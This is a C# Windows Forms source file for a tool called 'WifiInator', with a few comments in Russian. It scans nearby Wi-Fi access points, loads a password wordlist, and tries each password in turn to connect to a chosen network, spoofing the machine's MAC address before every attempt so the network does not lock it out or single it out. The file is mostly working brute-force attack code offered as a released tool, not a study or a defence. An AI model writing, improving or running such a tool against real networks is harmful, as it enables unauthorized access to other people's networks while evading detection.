using System;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Collections.ObjectModel;
using System.Reflection;
using System.Net;
//---------------------------------------
using SimpleWifi;
using System.ComponentModel;
using System.Reflection.Emit;
using System.IO;
using WifiBrute;


/*
v1.1.0 Update Notes (Released)
	1. Added Multithreading
	2. New Status Label
	3. Ability to Change the Connection Check Delay 

v1.2.0 Update Notes (Released)
	1. Added password count (done / total)
	2. Font Changes
	3. Added Version Number to title label
	3. Added Rescan button
*/

namespace WifiInator
{
	public partial class Form1 : Form
	{
		private static Wifi wifi = new Wifi();

      
		string[] passwords = { };

 
		public Form1()
		{
           
            InitializeComponent();
		}
        private void Form1_Load_1(object sender, EventArgs e)
        {
            
           
        }
        private void Form1_Load(object sender, EventArgs e)
        {
           
           
   
           
        }

       
      

        public static bool CheckForInternetConnection()
		{
			try
			{
				using (var client = new WebClient())
				using (var stream = client.OpenRead("http://www.google.com"))
				{
					return true;
				}
			}
			catch
			{
				return false;
			}
		}

		 

		private IEnumerable<AccessPoint> Scan()
		{
			IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
			return accessPoints;
		}

		private static void wifi_ConnectionStatusChanged(object sender, WifiStatusEventArgs e)
		{
			Console.WriteLine("\nNew status: {0}", e.NewStatus.ToString());
		}

		private void OnConnectedComplete(bool success)
		{
			Console.WriteLine("\nOnConnectedComplete, success: {0}", success);

		}

         private void progress_Click(object sender, EventArgs e)
        {

        }

        private void flowLayoutPanel3_Paint(object sender, PaintEventArgs e)
        {

        }
        private void flowLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {

        }
        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {

        }
       
        Thread t;
        private void button1_Click(object sender, EventArgs e)
		{
            if (button3.Text == "STOP")
            {
                button3.Text = "BRUTE";
            }
            else
            {
                button3.Text = "STOP";
            }


            if (t == null)
            {
                t = new Thread(async () =>
                {

                    var accessPoints = Scan();
                    AccessPoint selectedAP = accessPoints.FirstOrDefault(ap => ap.Name == listBox1.SelectedItem.ToString());

                    if (selectedAP == null)
                    {
                        MessageBox.Show("Please Select an Access Point");
                        return;
                    }

                    if (passwords.Length == 0)
                    {
                        MessageBox.Show("Please Select a Wordlist");
                        return;
                    }

                    bool connected = false;

                    foreach (string pass in passwords)
                    {
                        if (button3.Text == "BRUTE")
                        {
                            return;
                        }
                        else
                        {
                            MAC.Spoof(); //Подменяем мас адрес
                            progress.Text = "Trying Password: " + pass;

                            AuthRequest authRequest = new AuthRequest(selectedAP);
                            bool overwrite = true;

                            if (authRequest.IsPasswordRequired)
                            {
                                if (overwrite)
                                {
                                    if (authRequest.IsUsernameRequired) authRequest.Username = "";
                                    authRequest.Password = pass;
                                    if (authRequest.IsDomainSupported) authRequest.Domain = "";
                                }
                            }

                            try
                            {
                                var IsConnected = selectedAP.Connect(authRequest, overwrite);
                                Thread.Sleep(400);
                                if (IsConnected)
                                {
                                    MessageBox.Show("Connected");
                                    richTextBox1.Text = pass;
                                    connected = true;  // Установим флаг подключения в true
                                    return;
                                    break; //оно тут не нужно, но с ним код выглядит лучше так что пусть будет.

                                }
                            }
                            catch (Exception aue)
                            {
                                // обработка ошибки при подключении
                                MessageBox.Show(aue.Message); // Выводим информацию об ошибке
                                                              // Пауза в 1 секунду между попытками
                            }
                        }

                        if (!connected)
                        {
                            
                        }
                    }

                });
                t.Start();
            }
               

            // start the thread
            
             



        }
           

       

		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			System.Diagnostics.Process.Start(e.Link.LinkData.ToString());
		}

		private void button2_Click(object sender, EventArgs e)
		{
			OpenFileDialog oFile = new OpenFileDialog();
			openFileDialog1.InitialDirectory = "c:\\";
		 
			openFileDialog1.FilterIndex = 2;
			openFileDialog1.RestoreDirectory = true;
			string path;
			if (oFile.ShowDialog() == DialogResult.OK)
			{
				path = oFile.FileName;
                List<string> data = new List<string>();
                int i  = 0;
                try
                {
                    using (StreamReader sr = new StreamReader(path))
                    {
                        string line;
                        while ((line = sr.ReadLine()) != null)
                        {
                            // Обработка строки
                            if (i < 100)
                            {
                                richTextBox1.Text += line + "\n";
                                i++;
                            }
                            

                            data.Add(line); // или какая-то другая логика обработки

                            // Если данных слишком много, можно обрабатывать их порциями и сохранять/отправлять дальше
                        }
                    }
                }
                catch (Exception aue)
                {
                    Console.WriteLine("Ошибка при чтении файла: " + aue.Message);
                }
                passwords = data.ToArray();
                
                // Дальнейшая работа с данными
            }
        }
		 

		private void button3_Click(object sender, EventArgs e)
		{
            Thread t = new Thread(async () =>
            {
            listBox1.Items.Clear();
            // Проверяем, подключен ли компьютер к Wi-Fi перед сканированием
            if (CheckForInternetConnection())
            {
                MessageBox.Show("The computer is already connected to a Wi-Fi network. Please disconnect and then rescan.");

            }
            else
            {
               
                    IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
                    foreach (AccessPoint ap in accessPoints)
                    {
                        listBox1.Items.Add(ap.Name);
                    }
               
                
                
            }
            button1.Text = "RESCAN";
            });
            t.Start();
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
